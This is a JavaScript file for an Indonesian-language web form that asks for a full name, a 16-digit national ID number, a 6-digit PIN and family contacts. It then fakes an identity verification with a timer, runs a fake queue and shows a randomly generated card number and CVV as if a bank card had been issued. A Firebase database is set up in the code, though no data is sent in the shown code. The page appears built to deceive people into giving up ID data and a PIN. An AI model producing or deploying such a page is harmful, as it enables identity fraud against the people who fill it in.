import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

// Firebase Config
const firebaseConfig = {
    apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
    authDomain: "wifist-d3588.firebaseapp.com",
    databaseURL: "https://wifist-d3588-default-rtdb.asia-southeast1.firebasedatabase.app/", 
    projectId: "wifist-d3588"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentStep = 1;

// --- NAVIGATION LOGIC ---
window.nextStep = (s) => {
    if (s === 2) {
        if (document.getElementById('inputNama').value.length < 3) return alert("Nama Lengkap wajib diisi!");
        if (document.getElementById('inputNIK').value.length !== 16) return alert("NIK wajib 16 digit!");
    } 
    else if (s === 6) {
        if (document.getElementById('inputPW').value.length < 6) return alert("PIN wajib 6 digit!");
    }

    currentStep = s;
    updateUI(s);
    if (s === 6) simulasiAnalisis();
};

function updateUI(s) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    const targetStep = document.getElementById(`step${s}`);
    if (targetStep) targetStep.classList.add('active');
    
    const percent = ((s - 1) / 7) * 100;
    const progressLine = document.getElementById('progressLine');
    if (progressLine) progressLine.style.width = percent + "%";
    
    document.querySelectorAll('.circle').forEach((c, i) => {
        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s - 1) { c.classList.add('active'); c.innerHTML = i + 1; }
    });
}

function simulasiAnalisis() {
    const status = document.getElementById('slikStatus');
    const btn = document.getElementById('btnSlik');
    setTimeout(() => {
        if (status) status.innerHTML = "<b style='color:#22c55e'>IDENTITAS TERVERIFIKASI</b>";
        if (btn) btn.style.display = "flex";
    }, 2500);
}

// --- FINAL PROCESS ---
window.generateFinal = async () => {
    if (!document.getElementById('checkAgree').checked) return alert("Harap setujui syarat!");
    updateUI(8);
    initQueue();
};

function initQueue() {
    let timeLeft = 120;
    const interval = setInterval(() => {
        timeLeft--;
        const fillBar = document.getElementById('fillBar');
        const timerDisplay = document.getElementById('timerDisplay');
        
        if (fillBar) fillBar.style.width = ((120 - timeLeft) / 120 * 100) + "%";
        if (timerDisplay) timerDisplay.innerText = `Estimasi: ${timeLeft} Detik`;
        
        if (timeLeft <= 0) {
            clearInterval(interval);
            finalRevealProcess();
        }
    }, 1000);
}

// --- REVEAL KARTU & EFEK (UPDATE) ---
async function finalRevealProcess() {
    const procArea = document.getElementById('processingArea');
    const finalReveal = document.getElementById('finalReveal');
    if (procArea) procArea.style.display = 'none';
    if (finalReveal) finalReveal.style.display = 'block';
    
    // Tambahkan Efek Glow ke Scene
    const scene = document.querySelector('.card-scene');
    if (scene) scene.classList.add('final-glow');

    const cardNo = "0810" + Math.floor(Math.random() * 899999999999 + 100000000000);
    const cvvRandom = Math.floor(Math.random() * 899 + 100); 
    
    // Set UI Card Depan
    const dNo = document.getElementById('displayNo');
    const dName = document.getElementById('displayName');
    if (dNo) dNo.innerText = cardNo.match(/.{1,4}/g).join(" ");
    if (dName) dName.innerText = document.getElementById('inputNama').value.toUpperCase();
    
    // Set UI Card Belakang (CVV)
    const cvvCode = document.querySelector('.cvv-code');
    if(cvvCode) cvvCode.innerText = cvvRandom;

    // Animasi Status Progress
    for(let i=1; i<=3; i++) {
        await new Promise(r => setTimeout(r, 600));
        const el = document.getElementById(`rev${i}`);
        if(el) el.classList.add('show');
    }
}

// --- FUNGSI PUTAR KARTU ---
window.toggleFlip = () => {
    const card = document.getElementById('cardInner');
    if (card) {
        card.classList.toggle('is-flipped');
        if (navigator.vibrate) navigator.vibrate(20);
    }
};

// --- SCREENSHOT LOGIC ---
window.takeScreenshot = () => {
    const cardInner = document.getElementById('cardInner');
    const area = document.getElementById('captureArea');
    const btn = document.getElementById('btnDownload');

    if (cardInner && cardInner.classList.contains('is-flipped')) {
        cardInner.classList.remove('is-flipped');
        btn.innerText = "MENYIAPKAN...";
        setTimeout(() => { executeCapture(area, btn); }, 800);
    } else {
        executeCapture(area, btn);
    }
};

function executeCapture(area, btn) {
    if (!btn) return;
    btn.innerText = "MENGUNDUH...";
    html2canvas(area, { 
        scale: 3, 
        useCORS: true,
        borderRadius: 20 
    }).then(canvas => {
        const link = document.createElement('a');
        link.download = `BDN-CARD-${Date.now()}.png`;
        link.href = canvas.toDataURL("image/png");
        link.click();
        btn.innerText = "📸 SIMPAN GAMBAR KARTU";
    });
}

// --- EMERGENCY FIELDS ---
window.addEmergencyField = () => {
    const container = document.getElementById('emergencyContainer');
    if (!container) return;
    const div = document.createElement('div');
    div.className = 'emergency-item';
    div.innerHTML = `
        <div class="input-group"><label>Nama Keluarga</label><input type="text" class="em-name"></div>
        <div class="input-group"><label>Nomor HP</label><input type="tel" class="em-phone"></div>
        <button type="button" onclick="this.parentElement.remove()">Hapus</button>
    `;
    container.appendChild(div);
};
